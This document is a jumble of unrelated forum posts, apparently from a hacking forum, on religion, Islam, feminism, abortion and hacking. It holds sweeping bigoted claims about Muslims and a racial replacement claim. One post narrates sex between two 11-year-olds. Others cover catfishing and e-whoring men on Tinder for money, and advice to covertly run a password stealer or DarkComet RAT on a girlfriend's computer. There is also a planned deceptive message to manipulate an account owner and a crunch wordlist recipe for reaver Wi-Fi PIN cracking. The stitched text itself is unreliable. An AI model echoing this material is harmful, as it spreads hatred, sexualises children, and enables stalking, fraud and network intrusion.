All I asked the rep for was a refund on one-day shipping as there was a mistake with the carrier. She/He misunderstand and thought I was asking for a full-refund.

The status of the item still says it being returned and was never delivered:

2 answers to this.

The first is that once Adam and Eve sinned for the first time God established rules/punishments. There were a few like woman having to go through hard pains during childbirth and men having to work the land, but another one was that we as humans could not be in the presence of God until we die. That is when faith was created, as a punishment for Adam and Eve's sin, faith in a since is a test, and that test is resulted from our sin. If all went well with Adam and Eve we would be able to see God everyday and just chill with him like bro's lol, but they messed up. 

Also it says throughout the old  and new testament that tests and temptation strengthen our faith. When you go through something hard you always learn something from it. God uses this to teach us as well. When we go through something hard instead of clinging to the world God wants us to cling to him, the only thing in this world that will not let us down

He likes making threats.  I think he's from an Islamic country where i'd be killed for saying what i do on here & it confuses him.   The girl in the video makes the very good point, she doesn't get floods of insults, threats, personal attacks people spamming her video with dislikes when she makes videos on Christianity.

The points discussed by her anyway were important about Islam not being a religion of peace. He responded with a video in which she responded showing why he was false in his sincerity & had no points worthwhile.

The actual subject of Islam being peaceful or not even though it's hardly up for debate is quite important.

Ok i'll just be silent as thousands upon millions of people savage the world & keep introducing backward views into the society i live?  

I don't think that's sensible.  This isn't a stable set of beliefs in which you can respect or ignore. This is a dangerous set of beliefs that turns normal people into psychotic warriors as well as sexual predators.

When the Muslim population of my country doubled in the last 10 years & rape of underage girls by Muslim gangs was frequent all over the country & Islam was their guide & then the whole terrorism issue..it is not something anyone should ignore.

Hinduism, Sikhs whatever else is not a problem. Specifically Islam is a problem.  If it wasn't a potential problem to people physically or harm in anyway i wouldn't talk about it or care about it."

I read just for 4 pages of this thread, so here I go:

In the beggining, God created Adam and Eve good, according to His image, He didn't create robots-alike that come pre-programmed to do specific stuff.

You doubt God is an almighty, all knowing God? Because if He would have known humans were going to be bad, He would not make them?

Then you might need to know, that the God of creation, wants everybody to come to Him by THEMSELVES, He is NOT going to force anybody to follow Him or obey Him. 

Did He know Lucifer was going to go bad? YES, just like He knew I was going to cheat on my girlfriend one day. 

Did He condemn lucifer since day 1 when he was created? NO, he respected the free will of act. Just like he didn't kill me when I was born, because He knew I was going to cheat my gf in the future. 

He GIVES opportunities, just like Lucifer had them and decided not to repent, follow and obey, I had (And will have) the opportunity to repent. I was convinced one day that I'm a wicked, imperfect, flawless person on my own. And if I want to go and kill a person tonight, He may not stop me from doing it, but I'm sure He will NOT be pleased with it, therefore if I die by the police, whenever I face the Great Judge, the God of Love, the Creator, He will tell me I was a rebel against Him and His will, and I will be cast out to Hell.

Bottom line: 

You would say: ""Did God create child porn?"" Because it's bad, etc.
God created everything: body, pleasure, sex, it's our wicked minds looking for twisted things in God's creation.

Did God create terrorism? Did God create poverty???
It's funny, all of the sudden we blame God for EVERYTHING, for example poverty, and we FORGET or IGNORE those groups of people EXTREMELY rich, becoming richer and richer every second as we breathe. Is there enough money in the world to stop hunger? Absolutely yes. Do world leaders are willing to give away their money? NO.

Is there a way to stop wars, etc? Yes
Do country leaders want to stop it? No.

Is the wicked, human decisions we make, who rule the world nowadays.

That's why we need God.

Remember this:

""We don't go to Heaven because we are good, we go to Heaven because we are saved. We don't go to Hell because we are bad, we go to Hell because we are lost"".

Communism is government ownership of business which is literally by definition corruption.
Capitalism is the business owners owning the business which is complete freedom.
Socialism is everyone is working as business partners which is basically run as a democracy (Democracy is Tyranny of the majority)

It sounds good when you just hear it until you actually see it in action and in a Capitalist society you actually have the freedom to run a company in a socialist manner where each employee is completely equal yet in a socialist society if I want to hire a worker and he wants to work for me i am locked up and told I am a greedy criminal.

How to become a socialist in 10 easy steps

1) Be under 25
2) Buy a Macbook
3) Go to starbucks
4) Start a tumbler
5) Start blogging on your macbook at starbucks about how corperations are evil
6) Start watching MSNBC and The Young Turks
7) Start quoting them and talk down on others who disagree with the all mighty Rachel Maddow
8) Say everyone is Racist if they disagree with you when you say minorities are inferior and need special priviledges
9) Say Bourgeois 7 times a day
10) Follow Karl Marx and worship him as a god and say he was justified in killing his children, cheating on his wife, leaving her after fathering a child with another woman and spending all his inheritance funding terrorist organizations because he says capitalism is evil.

My views on Muslims have changed a lot. They have gradually got worse & worse & worse.  For every reasonable or open minded Muslim i speak to, there is 30 or 40 pretty damn insufferable ones.   I grew up with Muslim friends, my views of Muslims were good at one point.

I also agree that many have inaccurate views of Islam.  I have seen many say Christianity is stupid & although i don't believe in god Islam makes more sense.   Then they end up telling me Adam & Eve & other things is why Christianity is stupid.  They have no idea Islam believes the same thing.  

In the end it's nothing personal from me. I know many Muslims i know why they think how they do & i know that's human behavior.  I study psychology all the time.   If you are consumed from practically birth & it's a fact Muslim parents can hit their kids on the wrist if they do not pray or recite Islamic things correctly.  Then 5 times a day you must pray & etc etc etc.   There is no break. There is no reflection.  There is no time to see things from a different perspective or angle.  

If people are in love with a girl sometimes they cant see she is cheating or using them.  Once they break up maybe 4-5 months later they begin to understand all she was doing all the lies she was making.

I see like this. Muslims are in love with Islam & has no escape ever. So they cannot fully see what people like me see.   It is not a personal attack, just what i see isn't pretty & quite evidently bad for the world & many people in the world, and it would be wrong not to speak about it.   If you speak negative about Islam in general Muslims will hate, attack, insult you. & this happens a lot, but at least you are respectful.  Overall Muslims experience what poor people go through by fasting & i think Muslims should experience life as a Non Muslim for at least one month. It will be a an important learning process."

I actually agree with this slightly, that both parents should have some sort of agreement surrounding abortion or the alternative where both parents make arrangements for the child to be looked after once it's born.

 I think you cannot ever force a woman to go through with a pregnancy though, so until the time comes where children can be removed from the female and put somewhere else to grow then it's not feasible for any male to have his child grown to full term because it might entail forced pregnancy.

Ok... I have an idea. I could send her a message (from a anon website and proxy) saying:

""Hi, so I thought I'd let you know, your account is vulnerable at the moment. I don't even know your password, but I have access to your account. This is because of a security issue with Facebook's ""login approvals"". I have a direct link to the login approval page, then I use a browser plugin called ""TamperData"" to intercept the security code sent to your phone, which I enter and it lets me into your account. I've told Facebook but they haven't changed it. So yeah, thought I'd let you know.""

Which is complete bullshit obviously.

Hopefully this would prompt her to turn off login approvals, while not changing her password."

You can be arrested if a woman claims some sort of sexual related crime  took place.

You can be arrested for peeping or some sort of stalking.  Laws are often bent to fit a situation even if no actual law applies.  

You can and often will get in legal trouble if you get caught in the women's restroom as a man, and someone in there cares

Same can't be said for women, though

Havent really measured the FPS though but I guess its pretty high since Im a guy that notices alot of stuff that other peeps dont (One time while watching a movie I noticed a girl appeared for a tiny bit of time & My brtohers never noticed, I finally told em after the 3rd time she appeared & They had to repeat the scene like 20 times to notice it)

Some people dont notice stuff, I have a brother that plays games on full high with a shitty 5570 (I think) and his game stutters SO MUCH but hes like: ITS FINEE!!!!

And I would also like to challenge anyone who believes that it actually is a choice to try what I did. See if you can kiss your own sex, or possibly even legitimate date someone.

2. I'm most likely not going to make the blackmailing a reality.

3. It feels like the law agencies in my country gives less than one shit about pedofiles. Once before in my country it have been brought up in the media. No more. Again the subject need attention.

4. I'm not going to release any personal information, if I even have the slightest feeling that the information might be incorrect.

5. The police have stated that they would love cooperation with ""pedofile hunters"", as long as we don't exhibit them in public.

1. ""Liberty and justice for all""
HA! BULLSHIT! 
I wish it was true, and liberty and justice for all was the truth. But is isn't.
Short version: Until justice becomes blind of skin, gender, religion, race, and sexuallity I will NOT say the pledge.

2. ""Under God""
God does not exist.
Short Version: I will not be forced to do anything to do with a religion.

(Now it stops with things from the pledge)

3. The NSA

They were not interested in Islam.  The school is trying to meet guidelines from committee's and stupid mobs of jobsworths trying to promote 'cultural diversity' or some shit which is essentially a way to force young impressionable kids to go to mosque's and have to get islam shoved in their faces because there's so many muslims in the UK now they think this is the way to 'understand' them. Which is of course garbage.

Then they give the kids bad things such as label them racist or say they are truanting if they do not go.   

Meanwhile if a Muslim does not want to go to a church nobody would say anything. Two tier system. Load of bullshit. Keep supporting it though.

You use a software called manycam to have the video take the place of the webcam.
VCW's can be purchased from a duck from an old video game. Or you can Private message me and i can send you some links.

Maybe he just wants to make a dumb ass funny post on her wall, something she normally would not post, but friends would get the joke?

OP
My opinion on your request is as follows:
DarkComet RAT might be a little bit of overkill for your needs.

Being she is your girlfriend, I would think its safe to say you have access to her laptop/computer?

Why not just get run a password stealer/recovery app on the machine?
Its quick simple, usually not recognized as malicious software.
- No need to give your girlfriend a virus or backdoor
- No need to attempt to crack her account passwords.

Feminists do what they actually are meant to do, though. They're fighting for women's rights to achieve equality.
The problem is, when you fight for rights instead of fighting for equality, you're fighting to solve a temporary issue. That reason is why we have inequality in anti-domestic violence for men campaigns, different physical standards for military (and some other jobs, I believe (US)), alimony and child custody fights. Those problems were solved for a different era where it used to be unfair for women. Now it's unfair for men, but is no longer a fight for feminists because they are a movement for female rights.
So really, you can't blame them for hating men. They only look at the things that men have over them because it is much easier to recognize a problem that affects them as a person, over problems that affect an opposite. But whenever you bring up the ""feminazi"" stance, they'll go and say ""not all of us are like that."" If you bring up what I mentioned, they'll likely respond a rebuttal to one fallacy I have (such as, physical standards for military is actually starting to become equal standards for men and women, fought by a feminist) and completely ignore the argument as an entirety. They are so stuck to the ""feminist"" label and absolutely do not want to move away from it and to an ""egalitarian"" label because it is no longer strictly about women's rights. Though of course, they won't say that (I'm normally told: egalitarianism is feminism)."

I totally agree with you, these modern day feminist are so article that they don't preach logic they just preach pure hatred towards men for absolutely no reason.  Any man who tries to defend him self is considered a misogynist.

Dude you seem very naive.   You are judging Islam & Muslims by the actions of yourself or people you know. I am judging on large figures.

It is a religion of large scale rape, because Muslims view Non Muslim girls as lesser people, worthless skanks if they dress a certain way.  Thus having sex with them is no big deal, they even sell the girls like they are Muhammad and have slaves to pass around to other Muslims.

Muslim girls they actually want to marry, or marry off to a family or friends, then it is less likely they will rape them, but rape happens with Muslims girls also.

The issue was somebody claimed Christian bombers are just called bombers, while muslim bombers are called Islamic bombers. This of course is false.  And i refuted it.  

You want to talk about extremism & non extremism.  What i say is Islam inspires the extremism & muslims tolerate, and justify it even the ones who supposedly are not extremists.

Hence why a million people will protest in different countries over a cartoon. Yet i haven't seen any protests anywhere near that number over these terrorists.

Because he is a Muslim.  & Muhammad is the main prophet so their mind thinks they have to find a way to justify this action.  Rather than say that's wrong.

Same with stoning women to death.  Most people can say that's wrong.
But Muslims try and find a way to justify it because they think it's the punishment 'Allah' wants. 

This is the danger of a religion such as Islam.   It makes people accept, justify and encourage things that are wrong or barbaric due to their religion.

For example, they say they have faith, or they can feel his presence and his glory, the most used reasons. What really ticks me off is when they cnanot answer the question in any other way, or in their own way.

Anyway, I once saw a picture that showed a homeless man asking for spare change and no one gave him anything, not even a penny, it then said that people usually consider givin money to the homeless wrong. Then there was a pastor asking for money for the church and people did not hesitate when they threw the money in the collection basket. This kind of relates to what you are saying.

In the next couple of years she had 3 more kids, and ""god"" told her, ""I have given you the family you have wanted ever since you were a child.""

Hitting children is not child abuse? Well I suppose your entitled to your own opinion, however I disagree. Can you define hitting? I doubt you are referring to punching or smacking. Spanking your child or any sort of violence can lead into a drop of IQ, and make the child more aggressive.
Not only that but some people are soft minded and take things to heart, this could cause depression suicide or any sort of self harm.

On topic though: The ""know how it feels like to be hit"" Argument is in my opinion, a horrible one. It's like Raping someone and then putting it off as ""Well, next time you'll know what it feels like!"" Obviously the girl did not want to be raped, the child did not want to be hit."

Did you even read what I said? I never said culture changes testosterone. Culture of today vs the past is very different, and that can't be argued.

There is also a difference between how we were all raised. 

While the men, generally, seem to be more ""physically superior"" as you suggest, women are the ones who are more mentally ""superior"". There are studies shown where intelligence is connected to the X-chromosome, which is specifically from the mother.

It is not permissible for a Muslim woman to marry a non-Muslim man.

It is permissible for a Muslim man to marry a Christian/Jewish woman strictly under these two conditions:

Don't be dumb please. There is many contradicting verses and scripture.  Highlighting certain things and ignoring others is pointless.  It is not bigotry to say Muslims are terrorists, it's fact.   It is stupid to say all Muslims are terrorists but you failed to add that distinction.

Newsflash not everyone in the middle east is a Muslim. And your personal experiences are not exactly reflective of thousands upon millions of other stories and incidents that indicate some rather barbaric behavior.   I am sure some countries in the middle east are great countries.  Hell even Egypt was an amazing country not too long ago.  But now journalists are raped and assaulted in the street, females are continually sexually assaulted, churches were burned down etc etc.  

Saudi for example is a good country on the surface, it is rich, run well, clean.  Yet women cant drive, women are stoned to death, thousands of terrorists originate from there and they fund extreme sects of Islam in other countries.

1. You still continue to personally attack people, proving to everyone you CANNOT debate or argue properly at all.

2. Explain how Muslims don't have lives? Several Muslim families that I know personally have great careers (ex: doctor); yet you state that Muslims need to have lives?

3. Why is it your concern that a supposed dad does nothing every day just because he reads Islamic books and watches TV? That's like complaining about a Buddhist meditating every day.

4. Stop thinking all women cover up their faces. That's only a tiny sect of Islam where women cover up their face completely except for their eyes.

5. How do you know it's not rare? You only experienced it once yet you, and again, generalize that 1 in 5 Muslim families behave what you experienced?

6. It does not have anything to do with radicals at all. If the US didn't start any wars and act like the World Police, it wouldn't have gotten attacked (such as the US embassies and 9/11). Also, if you'd still think the reason for 9/11 was religious, you're wrong in the first place. There is one reason, one word, it's retaliation.

Anyways, you obviously seem to not be able to debate at all. You still continue to try and fight an imaginary argument that doesn't even exist considering you're so irrational and immature.

Thank you for the link Sythor. I will address what I was getting at below.

As for Natecat, your assumptions are beyond uncalled for. I have no contact with any feminists and if I did I would of stated that my response is based off a feministic perspective. You also cannot hold an argument without seeming childish enough to call someone idiotic because their viewpoint is not the same as yours. I shouldn't even reply to your response being that you in a way took it by your own means to use a derogatory term because thought it was needed. I only chose to respond to this because you posted something like what Sythor had done, so might as well respond to your response as well as his right? Seems like the logical thing to do. 

As for the whole brain thing isn't the bigger picture of it all. I was not getting at because left + right brain makes everything perfect is why gay rights doesn't seem correct. It is commonly known that males have certain qualities and females have certain qualities. So those qualities put together make a balance within each other put together. The brain thing was just to give an example of something that proves (past tense wise) that male and female are not the same as another besides psychically because I'm sure that you know men have penises and women have vagina's. Not to say a woman can't seem like a man, but I think if you look hard enough you can easily tell that men and women are not the same when it comes to certain ways of thought. 

And lastly, in your response you did not mention whether Gay rights are right or wrong, so I do not see why you'd argue against me if chances are we are in the same ballpark about the whole matter. It would of made some reasoning if you mentioned your side of the debate. 

Now Sythor's response was acceptable, it was informative and I value that he took the time to have a well enough response to give me the link to tell me the whole right brain, left brain thing was wrong."

Firstly, I am not a part of that disgustingly homophobic, racist, biased, and unreasonable West Baptist Church, and their satanic cult like love for God. ***IMG***[images/smilies/rolleyes.gif]***IMG***

Secondly, evil-lutionists are always trying to sway you into thinking we weren't born into the glory of the Lord, but instead they debase your soul, and corrupt your mind with ""nature"" and ""homosexuality"". It is a fact that nature is the devil, I'd like to see these evil-lutionists toss their children into their precious nature, and see how long they survive before the wolves get to them. Bet they'll be praying for God then, ""Oh dear God please bring back my babies!?"" Lastly, it is bible 101 that babies are born sinners. If you were a true Christian you'd understand where I'm coming from. God created love, and therefore he has created hate. That which God loves he also hates, and although he is forgiving, he is not always merciful to blasphemers. Take this prayer for example:

Baby murdering rape victim -
God please forgive me for not keeping my rape baby. Accept God can't forgive her, because she went to some scumbag Atheist abortion clinic where they love to push ideas like ""free choice"". There is a time and a place for abortion; At the very least you should be in the presence of a real Christian pastor who can lend support and/ or a helping hand during the procedure. This way you can bring the sinful bastard child into the world without persecution, and have him saved before he even takes his first breath. The mother can also be allowed to bleed out or be baptized as well. It is her choice and in doing so God hath cast one stone and ""killed two birds"" so to speak.

See God isn't that bad after all."

What you don't understand is ""cuss words"" all have real definitions that they share with other words. You could say words that mean the same thing as some of the cuss words and it be totally fine. 

Spoiler ***LINK***(Click to View)[javascript:void(0);]***LINK***

Fuck: To have sex with. used alone or as a noun ( the fuck ) or a verb in various phrases to express anger, annoyance, contempt, impatience, or surprise, or simply for emphasis.

Shit: Literal feces. an exclamation of disgust, anger, or annoyance.

Damn: Expression of anger or frustration. Condemn, esp. by the public expression of disapproval.

Hell: a place regarded in various religions as a spiritual realm of evil and suffering, often traditionally depicted as a place of perpetual fire beneath the earth where the wicked are punished after death. used to express annoyance or surprise or for emphasis.

Bitch: Female dog. Express displeasure; grumble.



As you see, all cuss words all have real meanings that don't seem so ""evil"" as our society likes to make them.

For instance the birthrate of an African woman in France is 5.6 That and combined with the birthrate of other non-Europeans is enough to become the majority in France in two generations. The White birthrate is below replacement level and combined with mass immigration from third world countries, there will be White minorities in White countries by 2050.

Depending on the circumstances, you could cross those lines while ewhoring, but I'm willing to bet 99% of the girls being used for this knowingly put their pictures on the internet.

Well that is kind of what I said. Women have always be held back and are  just now really starting to get full time jobs and jobs of any importance. Many employers today still hold gender to count for. So of course women are not equals in job importance, employment ratio, ect. They couldn't possibly be. In another 10 years I would say they will equal us if not have more employed than men. it's already around 60%-Men 40%-Women (Those numbers come from a New York Times article from 2011 so it might be different now.) As for who's best, it would have to be judged by the individual at individual tasks. Clearly men are usually better for physical labor jobs that require brute strength.

But then again you can't just say that makes women less than men. Maybe for this time but women haven't had the same rights as men for very long.

There isn't really any real evidence that say women are equal in the workplace, achievements, great people, inventions, ect, ect. One place I know women have a real hold on is art's. Most modern day artists are women and it has become a major woman profession. Writing was actually a big thing for women back in the 1800's because they really couldn't do anything but that or be a house wife or do both. It's kind of hard for women to be superior when they haven't even met us as equal's yet. They are equal with rights in most countries and that's the only thing they are equal with so far.

House M.D: Yeah, when I was around 10, there was this ""friend"" big guy in school, and he basically kept me as his puppy. It was the shittiest feeling ever, being afraid to say my own, and not obeying his seemingly logical and reasonable orders. In the end, I convinced the teachers to take him away to punishing school, and since then, I've always wanted to be in control fully. I'm very confident, but NOT EFFECTIVE, as a controller, I'd have to say.

I debated with another guy in this thread who believed the old testament Mosaic Law was still in effect today (Church of God) who was making so many logical fallacies it wasn't even funny, he then got frustrated, effectively yelled at me with text for messing up his foundations in religion and blocked me. Those kinds of people are who I dislike the most, not only do they hold illogical beliefs, but they are too closed-minded to debate openly and logically with someone else on their beliefs. I used to be a religious Christian myself and I purposely went on a science forum to debate my beliefs (because I believed I had the truth of course), I was honest and open and I ended up changing my beliefs based on the logic. It took awhile (33 pages of me debating with atheists), but I finally realized. I don't understand why there are so many who won't do the same.

If you think what you believe is the truth, there is no amount of debating that will change your position, because it is based on logic. The problem is NONE of us can know for sure that our beliefs are true, and that's what debates are for, to challenge our positions on subjects so that we can learn and progress in knowledge. The amount of people that think they can know for sure they have the truth and is NOT open and honest on these subjects is STAGGERING and depressing to be honest. It's just really sad.

Because there are many many parts of the world where being gay or having gay parents is not criticized, but those that do criticized are the ones that are criticized by everyone else for being a moron, so no one criticizes. The same is true for any bully, either they are criticizing race or depression or gender or what not, any bully is criticized in these parts of the world, and those are the forward thinking parts of the world and the future of the human race.

People are trying to help you understand that even though you think it's disgusting (because you aren't gay), you should still accept gays like everyone else, just like you accept a black guy or a female. All straight people think gay acts are disgusting, but that doesn't mean you should find gay people themselves disgusting.

You got the idea of Jesus being the son of God FROM the Bible. It's not logical that you now say it is bunk, or you don't have to follow what it says. What's the reasoning behind this?

I would just like to ask how you decide what to follow in the Qu'ran and what not to?

Please just continue your research of the Qur'an and religion as a whole. If you see something wrong in the Qur'an such as punishing homosexuals, it means you at least have some sort of open mind and can see all of the other contradictions, inconsistencies, errors, and fallacies in the Qur'an.

If you think that is wrong, don't you think about what other things could be questionable in the Qur'an? Such as teaching men can have ""up to 4 wives,"" yet women can't have multiple husbands; they have ""deficient minds"", and are ""inferior to men"". (quoting from respected Qur'an commentator, Maududi (d. 1979)) Or Muhammad marrying a 6 year old.

Quite a few problems with your statement here

First off ""You are so biased that you would subjugate a woman to AIDS over a medical procedure"" implies that all women who don't get circumcised in that little hypothetical scenario would get AIDS.  That is not the case.  The rate of AIDS in the civilized world (which is what this thread is discussing, not places like Africa which are clearly different) is about 1-2%. 

AIDS is NOT an ""epidemic"" in the civilized world.  Epidemic denotes widespread infection, not extreme rarity

Furthermore, few to no children are acquiring AIDS through intercourse which would be necessary for a circumcision to even mitigate the rate.

And circumcision IS a major alteration.  Sex is pretty much the one thing that humans are bent on doing constantly.  Everything else is done subconsciously to enable or increase the chance of having sex.  

And there are also many cases of male babies being KILLED from the blood loss of circumcision.

Show me one study which suggests that getting circumcised decreases your risk of getting HIV by as much as 60% please.  NOT a study which shows 60% lower rates among circumcised populations - correlation does not imply causation.

Furthermore, please provide evidence that waiting until people are able to give consent for this irreversible procedure would mitigate these health benefits even slightly.  Most cases of HIV in the civilized world aren't even acquired through sex, and most people who do acquire it do so after an age where they would be able to give consent

And as I've said before, in some cases the blood loss of a MGM patient ALSO can be fatal.  There are on average 100+ cases of this per year.

Furthermore, circumcised males are more likely to also develop tears and abrasions during intercourse because of how tighter their skin is to the penis than uncircumcised males.  Abrasion is even more common during self administration which could carry on to later intercourse"

You are so biased that you would subjugate a woman to AIDS over a medical procedure because you personally think it is humane. If I could become Immune to AIDS (which doesn't make sense since AIDS is a complication of HIV), then I would do it 100%. AIDS is an epidemic. I would try anything and everything in my power to ensure AIDS and HIV are gone from this Earth. Short of killing people, or causing drastic mutations/alterations. Of course, these would defeat the purpose. Saying that Male circumcision is a drastic alteration to non-circumcised males is blowing it way out of proportion.

The fact of the matter is, you ARE comparing Apples to Oranges. Male Circumcision has little risk, is well established and carries some health benefits. I will repeat, there is more benefit from having good hygiene than there is from circumcising, however, that doesn't make it negligible. Female Genital Mutilation has extremely small benefits, which DON'T include reducing the risk of HIV/AIDS. And in many cases, it can be FATAL because the female girl can be KILLED from blood loss."

Yeah, I understand where you're going with this. I don't get why people complain about something such as ""gay marriage"". It doesn't affect them in any way. It doesn't hurt them. That's why I believe it's perfectly normal for someone to be gay and to have a gay marriage. It's like saying, ""Okay, you're straight. I hate you. You're weird, you're abnormal, you're an outcase. Don't have a marriage."" No one has the rights to say that to you.

It's not personal preference, it's natural attraction. To say you don't want to date somebody of another race comes off as ""a negative view to somebody not of your kind.""

Just say you don't feel attracted. I may not be attracted to a black girl, it's not racist. (Although there are some dark girls who are fineeeeee. And honestly, they carry features that seem to have a peculiarity to European descent, and that's what makes me attracted. Completely natural.)

It's funny you say that.

I don't think you understand the reasoning behind our choice of picking 2D over 3D. Of course, happy relationships between real people exist - however, we have acknowledged that 3D girls simply pale in comparison to 2D. You'll never find a woman in real life as perfect as you would in anime. Real women are inferior in every aspect to our waifus. Why would you willingly settle for less?"

Okay i shall. I was just moving into a new house and we met the owners at the new house she had a daughter that was 11 also the time. I started to hang out with her and she was the only person i really knew.So after a weeks one day we were walking home from school to her house and her mom was not home from work yet and we kissed and all that good stuff then after a little bit of time she grabbed my penis and wanted to see it so i showed her and then i asked to her area and we ended up getting fully naked and then i asked if she wanted to try having sex she said she didn't know that she didn't want it to hurt and she was scared we talked about it for a couple of minutes then she said just be careful so i was careful and went slow and we only did it for a few minutes because she was scared her mom would get home and catch us..... we had sex tons of other times after that and i dated her for about a year before she moved :/

You're exactly right. And some guys just aren't going to play games or give you anything until you're sitting in front of them. There's nothing you can do in those cases.

Since you have to sort of pick the guys you can potentially get matched with anyway, I try to control for that. Guys who are way too old for Tinder (45 or 50+) tend to think the teenager they're hitting on will be awed into dropping her panties by nonchalant money flashing, and they also know in the back of their minds that they can't pull any punches if they want her to show up to actually meet.  Married guys desperate for an open minded and discreet side piece (you know them by the lack of facial pictures on their profile) are usually willing to jump through hoops, too."

It's been all over the place and varied with the tactic. Selling pictures to guys who insist they aren't cops, it's ranged $15-$30, but the work for those is a whole lot less. 

If I've put in the effort on the flirting, I've gotten between $50-$200. On the higher end, the guy thought he was talking my nice-girl alter ego into exposing herself for the first time. I earned every penny of that one.

The GPS spoofing has been awkward. I haven't quite figured out how Tinder updates your location, but it doesn't update all that frequently or predictably.  So I'll log on and it'll remember I was in, for example, Montana last, and keep listing me there until some unspecified later point when it'll switch to the location I'm trying to spoof to.  And then, more often than not, it'll revert at some point.

If a guy is watching the ""She's X miles away from you"" numbers, the fact that they swing by a thousand miles in a few minutes is a tad suspicious. So mostly I just haven't bothered spoofing."

I'm in the process of working out my idea and seeing if there's a call for someone as a kinda 'on-call whore voice'. Not really up for sex calls, if I was I could probably just do that to make some extra money.

If I call a possible buyer I'd play the part of a whore selling her wares so the odd giggle and mmmm would be included for effect - but not so sure on sex moans.

It would be easier to help you if you had of shown the screenshot of the terminal instead.
The 2 logical reason's are:
You entered a wrong command.
You changed the name of the file.
Let's deal with both of them and then if all else fails for you, you can try the GUI.

Firstly I'll explain the commands used and then the relationship between them should be self explanitory.

./crunch 4 4 9876543210 -d 3% -o Rafe_D

./crunch: Run crunch
4 4: Minimum length and Maximum length.
9876543210: These are the character's we want crunch to use, but more importantly, this is the order we want crunch to use them.
-d 3%: 
 -d Limits the number of consecutive identical characters. 
3 thus limiting them to 3 consecutive character's and automatically removing 9999, 8888 --> 1111, 0000 instead of manually deleting them ourselves as they are already in the start of the reaver file. 
% as this is a shortcut that crunch recognises as numeric character's.
-o:  Allows you to specify the file name / location for the output, e.g. /media/flashdrive/wordlist.txt

I intentionally left the File Path out of -o so that anyone can find the file, through numerous method's, in the crunch directory. It's named Rafe_D and the file path is as listed in the command.

gedit '/pentest/passwords/crunch/Rafe_D'

This does one of 2 things. Basically it tells gedit to either:
Open the file in the file path.
Create, Name and Open a file in the Directory of the File Path. 


You should now be armed with more than enough knowledge to create, find, understand and use the file.

Sorry if my answer seem's a bit harsh but part of the idea for the TuT was for people to learn something. It would be only to easy for me to have uploaded the .wpc file, told you were to put it, how to rename it and use it, but nobody would have learn't anything.

If you still can't get it working, in the next couple of days, let me know and I will work through it with you."

Incorrect. Just because he cleared the list doesn't mean that it's removed off Facebook's database(s). Which means if you contact the police and make it big, they will be able to see the IPs and give it to the police.

As for the second, if you get his ""real"" ip, you will be able to find his ISP, but they might not give away his personal information.

Even if she was ratted, the hacker would still have to log in his computer, unless she leave her computer for a long period of time, so he'll be able to do that through her computer. But I still doubt it.

You can backtrace it, but the chances that the hacker who might have ratted her is using his real IP address is below 1%. All the people nowadays use NO-IP and other DNS service providers. That way they remain ""anonymous"" and it helps fix port forwarding problems as well for those having dynamic IPs."

showing public affection - it's fine as long as you're not having sex on the street (which I would not understand, anyway)

wearing shorts/any revealing clothing despite your outrageous temperatures - this is untrue, you can wear the fuck you want as long as you're not naked

taking photos in public - where the fuck did this one come from

taking photos of women - that's illegal in most states in the US, if you don't have their permission.

Drugs/Alcohol - drinking age is 21, just like the US. If you want to buy alcohol from a street shop, get a license or buy from an off-license. Don't drink publicly, exactly as it is in the US.

Have you ever even been to Dubai or is this all from dailymail?

lol ofcourse im over exaggerating, that's a requirement when you're trying to convince people, with a logical sounding explanation. 

but you aren't, with the dip your balls in peoples soda or be a cop and steal drugs?

cause if you need a logical explanation for that.. it's quiet easy too.

as for McDonals, you'd probably or not even get fired. Customers most likely won't know, but if they do they could sue you. McDonals will obviously not let itself been taken down by some old family retard who maybe swallowed some dna by that.

as for the cop stealing drugs, All depending on what cop it is, and a matter if ""IF"" they find it out. As they got access to most case files and everything that's involved with a starting case. So i guess unless it's one studying to be one, in training, might have a problem but if you're 'at the force' i'm sure they'll let you go. They often even let people go when carrying drugs, kind of same thing. The cop took it from a Criminal anyway, and he's allowed to do that on duty. But if its part of his 'goal' , for example delivering that same drugs on the station, i dont know.

And for the commercials, it's all about subliminal. and they have huge manuals with them, which if you read them and do exactly as said in some cases you'd indeed lose the weight what they promise to be. Since market products unlike homeopathic medicines have to be approved to meet the promised results and to be brought on the market. If it doesn't, your bankrupt. Simple as that. 

But i indeed may be exaggerating in first post, although it's not really about the risks, more of getting people to do it anonymous. Thus a positive thing, since your customers will only find out who you are less possible.

To be fair the community isn't exactly female-friendly, or even outsider friendly in general.

There's probably a lot of girls (and women) interested in this stuff who either don't bother or don't get far because they get ran off by guy hackers who are jerks.

I mean if you read it, it makes sense he obv wanted something out of her such as money. To get that he has to give out a way of payment. I think thats where he gave himself up.

How did you do that? Was she on your LAN? If she was, I meant that you can't do anything with just an external IP and no access to the network. If you DID only have her external IP and no access to the LAN, then was she running windows XP? If so, in my responses, with the release of Vista, Windows 7, and Windows 8, I kind of assume that most people have one of those.

Yeah, but you don't see it as such. When you think ""I want someone in my life, I want a relationship"" you don't think ""I wanna bang that ass"".
That's rather what our id wants the most but okay, it's like saying that what our brains want the most is to be perfectly accepted in society while it's our super-ego which wishes so (not really a part of the brain).
It's a matter of perception.

But you don't seek a relationship to make the other person feel better or to serve them. You don't even care about who it's going to be.
There's nothing selfish about wanting someone to love, but sole love and relationships are two different things. I can have unrequited affectionate feelings toward someone, it doesn't make me selfish since it can be non-mutual and could probably make me feel lonelier if I don't end up with said person. If I want someone to love it doesn't mean I'll end up with them and it focuses more on the individual itself rather than it does on the feeling, on the ""she""/""he"" rather than the ""it"".
Wanting a relationship and wanting someone to love are two different things, imo."

I'm interested in technology and politics, most clubs and whatnot are for outside activities, something I'm not interested in.

Haha last week i saw a dutch program, a guy fell for a phising email saying that a woman was dying and wanted to give him 5 million.

He paid over 20.000 and was planning to pay way more, they send him a chest of black papers saying that he needs to buy a special liquid to wash the black off.

I swear that guy was a idiot.

We never expected it to get this big, that's why we were never careful with hiding our information. I was new to the hacking scene and could have never imagined what I was getting in to.

When we did reach that point of no return, that is when I quit. For a while I was proud of our size, it felt like we accomplished something, but then Xvisceral had been arrested... the Syrian Government was reported on using our product... It was too much for me after that. I realized I was in over my head.

Also, no problem about the questions. I enjoy talking about it."

I'm 6 foot 4, 240 pounds. I've got a bit of a stomach I need to get rid of again since I've been eating a lot (glad to not be eating prison food), but I'm fairly fit. I hike, run and swim regularly. Marjinz I saw on video chat a few times, he's pretty fit, has/had a very attractive girlfriend. Xvisceral I'm not sure of, he always kind of kind of came off as a sort of guy who didn't get out much, spent a lot of time at home. But Marjinz was constantly going out clubbing and I spend quite a bit of time out as well. I guess what I'm trying to say is at least 2 out of the 3 of us seem like rather regular people."

